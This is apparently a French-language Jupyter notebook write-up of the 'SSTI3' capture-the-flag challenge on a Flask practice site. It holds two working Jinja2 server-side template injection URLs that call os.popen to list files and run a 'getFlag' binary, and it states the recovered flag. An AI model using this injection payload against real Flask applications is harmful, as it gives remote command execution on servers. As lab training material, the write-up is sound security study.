{
 "cells": [
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# SSTI3\n",
    "\n",
    "> 250 points\n",
    "\n",
    "> https://ssti3.secu-web.blackfoot.dev/"
   ]
  },
  {
   "attachments": {},
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Première analyse\n",
    "\n",
    "- On a un champs text, qui, quand on rentre une string, l'écrit sur le site   \n",
    "- La page est créée coté serveur via un template\n",
    "- On sait que c'est une application Flask"
   ]
  },
  {
   "attachments": {},
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Via les injections, on peut facilement importer des librairie, et par la même occasion executer des commandes à l'interieur du serveur avec la fonction **popen**\n",
    "\n",
    "Pour commencer on va faire un **ls**\n",
    "\n",
    "https://ssti3.secu-web.blackfoot.dev?username={{request.application.__globals__.__builtins__.__import__(\"os\").popen(\"ls\").read()}}\n",
    "\n",
    "On remarque un fichier qui se nomme **getFlag**, sans extention, ça ressemble à un executable\n",
    "\n",
    "On le lance\n",
    "\n",
    "https://ssti3.secu-web.blackfoot.dev/?username={{request.application.__globals__.__builtins__.__import__('os').popen('./getFlag').read()}}\n",
    "\n",
    "Le contenu du fichier est donc **BFS{Oh_My..._I_Can_RCE_PyTh0N!!}**\n"
   ]
  },
  {
   "attachments": {},
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Flag\n",
    "\n",
    "Le flag est donc - BFS{Oh_My..._I_Can_RCE_PyTh0N!!}"
   ]
  }
 ],
 "metadata": {
  "language_info": {
   "name": "python"
  },
  "orig_nbformat": 4
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
